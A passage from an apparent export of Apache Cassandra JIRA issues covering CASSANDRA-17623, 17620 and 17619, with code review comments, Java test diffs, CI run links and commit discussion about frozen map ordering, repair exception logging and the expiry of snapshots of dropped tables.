+                                                  .build();
+        for (int i = 0; i < 100; i++)
+        {
+            LinkedHashMap<String, String> map = new LinkedHashMap<>();
+            map.put(""a_key"", ""av"" + i);
+            map.put(""b_key"", ""zv"" + i);
+            writer.addRow(String.valueOf(i), map);
+        }
+        for (int i = 100; i < 200; i++)
+        {
+            LinkedHashMap<String, String> map = new LinkedHashMap<>();
+            map.put(""b_key"", ""zv"" + i);
+            map.put(""a_key"", ""av"" + i);
+            writer.addRow(String.valueOf(i), map);
+        }
+        writer.close();
+        loadSSTables(dataDir, keyspace);
+
+        UntypedResultSet rs = QueryProcessor.executeInternal(""SELECT * FROM "" + qualifiedTable + "";"");

Review Comment:
   Nit: we don't need the `;` at the end of the queries. It's quite common to see it in tests, so feel free to ignore it if you prefer it this way.



##########
test/unit/org/apache/cassandra/cql3/validation/entities/CollectionsTest.java:
##########
@@ -1980,4 +1981,99 @@ public void testSelectionOfEmptyCollections() throws Throwable
             assertRows(execute(""SELECT m['0'..'1']['3'..'5'], s[0..1][3..5] FROM %s WHERE k = 3""), row(null, null));
         });
     }
+
+    // Tests for CASSANDRA-17623
+    // Before CASSANDRA-17623, parameterized queries with maps as values would fail because frozen maps were
+    // required to be sorted by the sort order of their key type, but weren't always sorted correctly.
+    // Also adding tests for Sets, which did work because they always used SortedSet, to make sure this behavior is maintained.
+    // We use `executeNet` in these tests because `execute` passes parameters through CqlTester#transformValues(), which calls
+    // AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.

Review Comment:
   Nit: this could be a block comment:
   ```suggestion
       /*
        Tests for CASSANDRA-17623.
        Before CASSANDRA-17623, parameterized queries with maps as values would fail because frozen maps were required to 
        be sorted by the sort order of their key type, but weren't always sorted correctly. Also adding tests for Sets, 
        which did work because they always used SortedSet, to make sure this behavior is maintained.
        We use `executeNet` in these tests because `execute` passes parameters through CqlTester#transformValues(), which 
        calls AbstractType#decompose() on the value, which ""fixes"" the map order, but wouldn't happen normally.
        */
   
   ```



;17/May/22 18:00;githubbot;600","smiklosovic closed pull request #1633:     CASSANDRA-17623 - Fix issue where frozen maps may not be serialized in the correct order (4.1)
URL: https://github.com/apache/cassandra/pull/1633


;17/Jun/22 07:36;githubbot;600","smiklosovic closed pull request #1634: CASSANDRA-17623 - Fix issue where frozen maps may not be serialized in the correct order (4.0)
URL: https://github.com/apache/cassandra/pull/1634


;17/Jun/22 07:36;githubbot;600","smiklosovic closed pull request #1635: CASSANDRA-17623 - Fix issue where frozen maps may not be serialized in the correct order (3.11)
URL: https://github.com/apache/cassandra/pull/1635


;17/Jun/22 07:36;githubbot;600","smiklosovic closed pull request #1636: CASSANDRA-17623 - Fix issue where frozen maps may not be serialized in the correct order (3.0)
URL: https://github.com/apache/cassandra/pull/1636


;17/Jun/22 07:36;githubbot;600","smiklosovic closed pull request #1621: CASSANDRA-17623 - Fix issue where frozen maps may not be serialized in the correct order
URL: https://github.com/apache/cassandra/pull/1621


;17/Jun/22 07:37;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,12600,,,0,12600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,drohrer,frankgh,ycai,,,,,,,,,,,,Correctness -> Recoverable Corruption / Loss,,,,,,,,Challenging,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri May 20 11:01:44 UTC 2022,,,,,,,All,,,,"0|z12bi0:",9223372036854775807,,,,adelapena,maedhroz,,,Normal,,2.1.3,,https://github.com/apache/cassandra/commit/ffc4c89c3df7ad0ae73ebefdcb7e15a2790c0a52,,,,,,,,,"Unit tests at multiple levels added to test.

Github PRs/Circle runs:

 

Trunk: [https://github.com/apache/cassandra/pull/1621]

Circle:

[java8_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/18/workflows/d33b2827-b970-4fc2-a56e-4ed68a532005]

[java11_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/18/workflows/4631f123-ffde-4151-833c-ecd0b9378f3f]

4.1: [https://github.com/apache/cassandra/pull/1633]

Circle:

[java8_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/19/workflows/deb9a03f-53e5-47be-8f6a-a4e60db6e375]

[java11_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/19/workflows/ca3763ea-bbb9-42c5-bfc7-3291969f04f0]

4.0: [https://github.com/apache/cassandra/pull/1634]

Circle

[java8_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/20/workflows/3a596abf-d173-44a2-b172-e7e74aaa9c3e]

[java11_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/20/workflows/a4532032-ef90-42ba-8b13-21b68d0825de]

3.11: [https://github.com/apache/cassandra/pull/1635]

Circle: [java8_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/22/workflows/eb51d3db-c196-4031-acc6-b36deb060dc7]

3.0: [https://github.com/apache/cassandra/pull/1636]

Circle: [java8_tests|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/23/workflows/4f6428c2-a4f9-4bee-80d6-22519f0b5c75]",,,,,"13/May/22 15:16;drohrer;[Java 11 tests in CirclCI|https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/13/workflows/99c3468f-574e-4781-8632-ec70168ec23f]:  are green...

More complete [Java 8 workflow| https://app.circleci.com/pipelines/github/JeetKunDoug/cassandra/13/workflows/5cc795e2-8966-4203-8b99-7fc73a74d026] has a few failures, but none look related, and the few unit tests I checked pass locally;;;","13/May/22 15:52;maedhroz;I'm guessing we'll want to fix this on at least 4.0, 4.1, and trunk.;;;","13/May/22 20:05;drohrer;It goes back as far as 3.0 (confirmed by adding just the new unit tests), so it feels like we should also be backporting to 3.0 and 3.11 given it at least _looks_ like a data loss bug (even if the data is {_}there{_}, you may not be able to read it the way you'd expect, although the map key slicing stuff was introduced in 4.0, selecting by map value would still theoretically be supported in 3.0 I believe);;;","16/May/22 16:24;maedhroz;[~drohrer] I don't think 3.0 is supported now, so probably just 3.11 if you really want to go pre-4.0.;;;","16/May/22 16:26;brandon.williams;We could probably do one more 3.0 last gasp release, though.;;;","16/May/22 16:31;e.dimitrova;I think there is some misunderstanding, according to our website this is the last agreement:
h4. Apache Cassandra 3.0
h6. Released on 2022-02-08
h6. Maintained until 4.2.0 release (May-July 2023);;;","16/May/22 16:51;maedhroz;Apologies. We made a special dispensation for 3.0.;;;","16/May/22 16:56;e.dimitrova;Yes, unfortunately, we will suffer with more branches this time for the greater good :D ;;;","16/May/22 21:23;maedhroz;+1;;;","17/May/22 19:19;drohrer;Added PRs for all branches (3.0, 3.11, 4.0, 4.1) plus Circle links for each.;;;","18/May/22 10:33;adelapena;It seems that Circle is not properly printing the test results for the provided runs, which makes it difficult to know what tests have failed. Trying again with midres pre-commit workflows:
||PR||CI||
|[3.0  |https://github.com/apache/cassandra/pull/1636]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1566/workflows/8fdd00f6-3771-4479-8667-873238cd983b]|
|[3.11 |https://github.com/apache/cassandra/pull/1635]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1563/workflows/d3aa9a48-a877-47d4-9dde-05d5cfc47fde]|
|[4.0  |https://github.com/apache/cassandra/pull/1634]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1567/workflows/12090435-5ed4-45f0-ab18-60ed860dd305] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1567/workflows/f3465751-41d0-4643-8cbb-5893b83401dd]|
|[4.1  |https://github.com/apache/cassandra/pull/1633]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1564/workflows/e8dbd50a-d574-4ef8-a741-795a93cd3e85] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1564/workflows/31dc3bd6-0006-47f0-af4e-5cd568be89be]|
|[trunk|https://github.com/apache/cassandra/pull/1621]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1565/workflows/b9ad62b4-e1f9-425f-9808-2a4488b3aa1a] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1565/workflows/4af37b70-e43d-4c67-8711-151055ba3285]|;;;","18/May/22 10:58;adelapena;The new tests {{testInsertingMapDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice}} and {{testInsertingSetDataWithParameterizedQueriesIsKeyOrderIndependentWithSelectSlice}} fail in 3.0 and 3.11 because those branches don't allow selecting map nor set elements. That feature was introduced in 4.0 by CASSANDRA-7396.;;;","18/May/22 11:15;adelapena;Some of the new tests added to {{CQLSSTableWriterTest}} consistently fail in 3.0, both locally and [on CI|https://app.circleci.com/pipelines/github/adelapena/cassandra/1566/workflows/8fdd00f6-3771-4479-8667-873238cd983b/jobs/16619].;;;","18/May/22 12:17;drohrer;Sorry for the test breakage - I was having trouble getting IntelliJ to actually run tests on the 3.X branches yesterday evening so I pushed to let Circle run them... I've managed to get things running again this morning, and have fixed up the tests in both 3.0 and 3.11 by removing the ones that aren't supported and fixing the missing {{assert dataDir.mkdirs()}} calls in the 3.0 tests, which weren't needed in 3.11 or later as the test sets them up in a {{@Before}} block.;;;","18/May/22 12:42;adelapena;No worries, here is a new CI run for 3.0 and 3.11, including some repeated runs of {{CQLSSTableWriterTest}}:

||PR||CI||
|[3.0  |https://github.com/apache/cassandra/pull/1636]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1569/workflows/30de5a88-d34c-42a0-a419-c52015ff5c3b]|
|[3.11 |https://github.com/apache/cassandra/pull/1635]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1570/workflows/157cf06e-a9c7-4f5f-b607-2d493fc2d017]|;;;","18/May/22 17:17;adelapena;CI results look good to me, +1. All the test failures can be reproduced in the unpatched branches, and most of them are well-known. I have created tickets for those failures that didn't have one yet:
* {{testScrubCorruptedCounterRow}}: CASSANDRA-17314
* {{test_force_repair_range_async}}: CASSANDRA-17594
* {{test_failure_during_validation}}: CASSANDRA-17594
* {{test_dead_sync_initiator}}: CASSANDRA-17594
* {{test_multi_partition_consistent_reads_after_write}}: CASSANDRA-17594
* {{test_contention_many_threads}}: CASSANDRA-17594
* {{replaceAliveHost}}: CASSANDRA-17594
* {{test_user_defined_compaction}}: CASSANDRA-17587
* {{testSimpleStrategy}}: CASSANDRA-17636
* {{test_compaction_throughput}}: CASSANDRA-17637;;;","19/May/22 10:04;adelapena;[~maedhroz] [~frankgh] are we ready to commit?

[~drohrer] is the list of three authors of this ticket correct?;;;","19/May/22 12:17;drohrer;I was the primary author - Yifan figured out that it affected more than just the CQLSSTableWriter path and added the test - Francisco and Yifan both paired with me for a few hours working on making sure the fix was right, improving things like making all of the Map code require a SortedMap implementation vs. just fixing the one line that fixed the bug, etc.

So yeah, I think so, but not sure how we'd normally credit that work?;;;","19/May/22 12:29;adelapena;I'd say that you give credit to whoever you think should be an author, provided that they are happy with it. I was just asking for preparing the commit message, in case some reviewer or previous assignee was accidentally included in the list of authors.;;;","19/May/22 12:31;drohrer;Then yeah, the authors list is right - they both made significant contributions to the patch.;;;","20/May/22 11:01;adelapena;Committed to 3.0 as [ffc4c89c3df7ad0ae73ebefdcb7e15a2790c0a52|https://github.com/apache/cassandra/commit/ffc4c89c3df7ad0ae73ebefdcb7e15a2790c0a52] and merged to [3.11|https://github.com/apache/cassandra/commit/0e1d068d9237de39b53992522eba4b40afb0e72b], [4.0|https://github.com/apache/cassandra/commit/5cf6db30f6b907e573c20b4f7b2958fb7e8995e1], [4.1|https://github.com/apache/cassandra/commit/c1d163abad7279c7d8bb4e76bb39de47c90bbec7] and [trunk|https://github.com/apache/cassandra/commit/56ce8d1f7f90fa9dd9d1b0e3507dab0cd2dec0cf].;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Incremental repair leaks SomeRepairFailedException after switch away from flatMap,CASSANDRA-17620,13444209,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,10/May/22 16:25,22/Oct/22 11:33,13/Jul/23 08:40,10/May/22 22:28,4.1,4.1-alpha1,,,,,Consistency/Repair,,,,0,,"This is an extension of CASSANDRA-17549.

Incremental repair used to do a flatMap where it returned a failed future of SomeRepairFailedException; this would not trigger our failure logging to log it due to the fact the executor didn’t know about it and RepairRunnable knew to ignore that error, a change was made to use map and throw the exception, and later that behavior was updated to trigger uncaughtException handling which leaks this exception.

To roll back to previous behavior, we should switch back to flatMap to avoid this logging",,benedict,dcapwell,maedhroz,,,,,,,,,,,,"smiklosovic closed pull request #1616: CASSANDRA-17620: Incremental repair leaks SomeRepairFailedException after switch away from flatMap
URL: https://github.com/apache/cassandra/pull/1616


;22/Oct/22 11:33;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,600,,,0,600,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17549,,,,,,,,,,,,,,,,,,,,0.0,dcapwell,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Low Hanging Fruit,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue May 10 20:23:59 UTC 2022,,,,,,,All,,,,"0|z128i8:",9223372036854775807,,,,benedict,,,,Critical,,NA,,https://github.com/apache/cassandra/commit/5f5d2e65864d229baa6a20c72bb8e9189f13d395,,,,,,,,,updated tests,,,,,"10/May/22 16:57;benedict;+1;;;","10/May/22 20:23;dcapwell;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.1|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17620-cassandra-4.1-EAE918A2-F323-4268-99BB-0A4AB11F740A]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17620-cassandra-4.1-EAE918A2-F323-4268-99BB-0A4AB11F740A]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1699/]|
|trunk|[branch|https://github.com/dcapwell/cassandra/tree/commit_remote_branch/CASSANDRA-17620-trunk-EAE918A2-F323-4268-99BB-0A4AB11F740A]|[build|https://app.circleci.com/pipelines/github/dcapwell/cassandra?branch=commit_remote_branch%2FCASSANDRA-17620-trunk-EAE918A2-F323-4268-99BB-0A4AB11F740A]|[build|unknown]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Expired snapshots of dropped tables are not removed after node restart,CASSANDRA-17619,13444197,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,paulo,paulo,paulo,10/May/22 15:22,05/Oct/22 22:30,13/Jul/23 08:40,29/May/22 19:45,4.1,4.1-alpha1,5.0,,,,Local/Snapshots,,,,0,,"Expired TTL snapshots from a dropped table are only removed if the node is not restarted after the table is dropped.

The reason for this is because {{SnapshotManager}} is using the old implementation of {{listsnapshots}} to load snapshots in memory during node startup, before CASSANDRA-16843 is fixed so it doesn't keep track of snapshots of dropped tables.

We should make {{SnapshotManager}} use the new implementation to load snapshots of dropped tables in memory, what ensures they will be removed when expired.",,paulo,smiklosovic,,,,,,,,,,,,,"smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r869612488


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,8 +108,15 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());
+        addSnapshots(loader.loadSnapshots());
+    }
+
+    @VisibleForTesting
+    protected synchronized void addSnapshots(Collection<TableSnapshot> snapshots)
+    {
+        logger.debug(""Adding snapshots: {}"", snapshots.stream().map(s -> s.getId()).collect(Collectors.toList()));

Review Comment:
   To be explicit, this will be printed like: ""Adding snapshots: [""snapshot1"", ""snapshot2"",""snapshot3""]"" ?
   I think there is some joining collector which just separates it by commas and leaves brackets. I consider it to be just nicer.



;10/May/22 19:33;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r869616542


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,8 +108,15 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());

Review Comment:
   Dont you think we might have `loader` as a property of `SnapshotManager` ? Why do we need to create an instance every time?
   
   btw, I just went through that SnapshotLoader class as such and I would change one of the constructors to this:
   
       public SnapshotLoader(String[] dataDirectories)
       {
           this(Arrays.stream(dataDirectories).map(Paths::get).collect(Collectors.toList()));
       }
   
   I know it is not relevant to this patch and changes related to this but I find it just easy to change, really. Just an idea. 



;10/May/22 19:38;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r869616542


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,8 +108,15 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());

Review Comment:
   Dont you think we might have `loader` as a property of `SnapshotManager` ? Why do we need to create an instance every time?
   
   We are also creating it in `StorageService.getSnapshotDetails`. Can not we somehow make it by one instance?
   
   btw, I just went through that SnapshotLoader class as such and I would change one of the constructors to this:
   
       public SnapshotLoader(String[] dataDirectories)
       {
           this(Arrays.stream(dataDirectories).map(Paths::get).collect(Collectors.toList()));
       }
   
   I know it is not relevant to this patch and changes related to this but I find it just easy to change, really. Just an idea. 



;10/May/22 19:40;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r869621316


##########
test/distributed/org/apache/cassandra/distributed/test/SnapshotsTest.java:
##########
@@ -222,6 +224,71 @@ public void testListSnapshotOfDroppedTable()
         instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
     }
 
+    @Test
+    public void testTTLSnapshotOfDroppedTable()
+    {
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");

Review Comment:
   why rf 2? dont we have just one node? Also, can no you use that distributed keyspace which is created already?



;10/May/22 19:45;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r869621492


##########
test/distributed/org/apache/cassandra/distributed/test/SnapshotsTest.java:
##########
@@ -222,6 +224,71 @@ public void testListSnapshotOfDroppedTable()
         instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
     }
 
+    @Test
+    public void testTTLSnapshotOfDroppedTable()
+    {
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");
+        cluster.schemaChange(""CREATE TABLE default.tbl (key int, value text, PRIMARY KEY (key))"");
+
+        populate(cluster);
+
+        instance.nodetoolResult(""snapshot"",
+                                ""-t"", ""tag1"",
+                                ""-kt"", ""default.tbl"",
+                                ""--ttl"", String.format(""%ds"", FIVE_SECONDS)).asserts().success();
+
+        // Check snapshot is listed when table is not dropped
+        instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
+
+        // Drop Table
+        cluster.schemaChange(""DROP TABLE default.tbl;"");
+
+        // Check snapshot is listed after table is dropped
+        instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
+
+        // Check snapshot is removed after at most 10s
+        await().timeout(2 * FIVE_SECONDS, SECONDS)
+               .pollInterval(1, SECONDS)
+               .until(() -> !instance.nodetoolResult(""listsnapshots"").getStdout().contains(""tag1""));
+    }
+
+    @Test
+    public void testTTLSnapshotOfDroppedTableAfterRestart()
+    {
+        int TWENTY_SECONDS = 20; // longer TTL to allow snapshot to survive node restart
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");

Review Comment:
   same, rf = 2, why not 1



;10/May/22 19:45;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r869621492


##########
test/distributed/org/apache/cassandra/distributed/test/SnapshotsTest.java:
##########
@@ -222,6 +224,71 @@ public void testListSnapshotOfDroppedTable()
         instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
     }
 
+    @Test
+    public void testTTLSnapshotOfDroppedTable()
+    {
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");
+        cluster.schemaChange(""CREATE TABLE default.tbl (key int, value text, PRIMARY KEY (key))"");
+
+        populate(cluster);
+
+        instance.nodetoolResult(""snapshot"",
+                                ""-t"", ""tag1"",
+                                ""-kt"", ""default.tbl"",
+                                ""--ttl"", String.format(""%ds"", FIVE_SECONDS)).asserts().success();
+
+        // Check snapshot is listed when table is not dropped
+        instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
+
+        // Drop Table
+        cluster.schemaChange(""DROP TABLE default.tbl;"");
+
+        // Check snapshot is listed after table is dropped
+        instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
+
+        // Check snapshot is removed after at most 10s
+        await().timeout(2 * FIVE_SECONDS, SECONDS)
+               .pollInterval(1, SECONDS)
+               .until(() -> !instance.nodetoolResult(""listsnapshots"").getStdout().contains(""tag1""));
+    }
+
+    @Test
+    public void testTTLSnapshotOfDroppedTableAfterRestart()
+    {
+        int TWENTY_SECONDS = 20; // longer TTL to allow snapshot to survive node restart
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");

Review Comment:
   same, rf = 2, why not 1 and why dont we use default keyspace.



;10/May/22 19:46;githubbot;600","smiklosovic commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r869622809


##########
test/distributed/org/apache/cassandra/distributed/test/SnapshotsTest.java:
##########
@@ -35,7 +35,10 @@
 import org.apache.cassandra.distributed.api.NodeToolResult;
 import org.apache.cassandra.distributed.shared.WithProperties;
 
+import static java.util.concurrent.TimeUnit.SECONDS;
+import static org.apache.cassandra.db.ColumnFamilyStore.SNAPSHOT_DROP_PREFIX;
 import static org.apache.cassandra.distributed.shared.ClusterUtils.stopUnchecked;
+import static org.awaitility.Awaitility.await;
 
 public class SnapshotsTest extends TestBaseImpl

Review Comment:
   do we also test (somewhere) that dropping of whole keyspace will create snapshots on individual tables?



;10/May/22 19:47;githubbot;600","pauloricardomg commented on code in PR #1615:
URL: https://github.com/apache/cassandra/pull/1615#discussion_r871763069


##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,8 +108,15 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());

Review Comment:
   > Dont you think we might have loader as a property of SnapshotManager ? Why do we need to create an instance every time?
   
   Since this is a bug fix I would prefer not to make loader a property of SnapshotManager because it's out of the scope of this task.
   
   The SnapshotLoader class was originally designed to be used only once, like a builder. In order to make the class reusable I would need to change the design and update tests so I would prefer to leave for post 4.1.
   
   After 4.1 is out I will create a new PR with a major refactoring moving all snapshot logic to SnapshotManager, based on this branch implementation:
   * https://github.com/pauloricardomg/cassandra/tree/CASSANDRA-16843-final
   
   > We are also creating it in StorageService.getSnapshotDetails. Can not we somehow make it by one instance?
   
   same as above, prefer to not change this for now but will do later as part of the refactoring.
   
   Is this ok for now? I can add a comment with a small TODO if you'd like.



##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,8 +108,15 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());
+        addSnapshots(loader.loadSnapshots());
+    }
+
+    @VisibleForTesting
+    protected synchronized void addSnapshots(Collection<TableSnapshot> snapshots)
+    {
+        logger.debug(""Adding snapshots: {}"", snapshots.stream().map(s -> s.getId()).collect(Collectors.toList()));

Review Comment:
   Updated. New output:
   ```
   DEBUG [main] 2022-05-12 17:08:30,773 SnapshotManager.java:119 - Adding snapshots: ks:tbl:c7483545-103a-493e-b66e-6d96e60d3878:expired, ks:tbl:984bd8f1-35fd-44d7-b69b-52422614e25f:non-expired, ks:tbl:deff9907-495b-4497-8275-ffdfdfc3ad7b:non-expiring.
   ```



##########
src/java/org/apache/cassandra/service/snapshot/SnapshotManager.java:
##########
@@ -116,8 +108,15 @@ public synchronized void addSnapshot(TableSnapshot snapshot)
     @VisibleForTesting
     protected synchronized void loadSnapshots()
     {
-        logger.debug(""Loading snapshots"");
-        snapshotLoader.get().forEach(this::addSnapshot);
+        SnapshotLoader loader = new SnapshotLoader(DatabaseDescriptor.getAllDataFileLocations());

Review Comment:
   > btw, I just went through that SnapshotLoader class as such and I would change one of the constructors to this:
   
   updated 👍 



##########
test/distributed/org/apache/cassandra/distributed/test/SnapshotsTest.java:
##########
@@ -222,6 +224,71 @@ public void testListSnapshotOfDroppedTable()
         instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
     }
 
+    @Test
+    public void testTTLSnapshotOfDroppedTable()
+    {
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");

Review Comment:
   > why rf 2?
   
   copied over from previous tests - fixed all tests to use RF=1 on 007958f8746799f4ca89a51b82bdd9d20eae1494.
   
   > Also, can no you use that distributed keyspace which is created already?
   
   This whole class uses this format and fixing would be out of the scope of this ticket. Is it fine if we refactor this later?



##########
test/distributed/org/apache/cassandra/distributed/test/SnapshotsTest.java:
##########
@@ -222,6 +224,71 @@ public void testListSnapshotOfDroppedTable()
         instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
     }
 
+    @Test
+    public void testTTLSnapshotOfDroppedTable()
+    {
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");
+        cluster.schemaChange(""CREATE TABLE default.tbl (key int, value text, PRIMARY KEY (key))"");
+
+        populate(cluster);
+
+        instance.nodetoolResult(""snapshot"",
+                                ""-t"", ""tag1"",
+                                ""-kt"", ""default.tbl"",
+                                ""--ttl"", String.format(""%ds"", FIVE_SECONDS)).asserts().success();
+
+        // Check snapshot is listed when table is not dropped
+        instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
+
+        // Drop Table
+        cluster.schemaChange(""DROP TABLE default.tbl;"");
+
+        // Check snapshot is listed after table is dropped
+        instance.nodetoolResult(""listsnapshots"").asserts().success().stdoutContains(""tag1"");
+
+        // Check snapshot is removed after at most 10s
+        await().timeout(2 * FIVE_SECONDS, SECONDS)
+               .pollInterval(1, SECONDS)
+               .until(() -> !instance.nodetoolResult(""listsnapshots"").getStdout().contains(""tag1""));
+    }
+
+    @Test
+    public void testTTLSnapshotOfDroppedTableAfterRestart()
+    {
+        int TWENTY_SECONDS = 20; // longer TTL to allow snapshot to survive node restart
+        IInvokableInstance instance = cluster.get(1);
+
+        cluster.schemaChange(""CREATE KEYSPACE IF NOT EXISTS default WITH replication = {'class': 'SimpleStrategy', 'replication_factor': 2};"");

Review Comment:
   fixed to use rf=1 on 007958f8746799f4ca89a51b82bdd9d20eae1494



##########
test/distributed/org/apache/cassandra/distributed/test/SnapshotsTest.java:
##########
@@ -35,7 +35,10 @@
 import org.apache.cassandra.distributed.api.NodeToolResult;
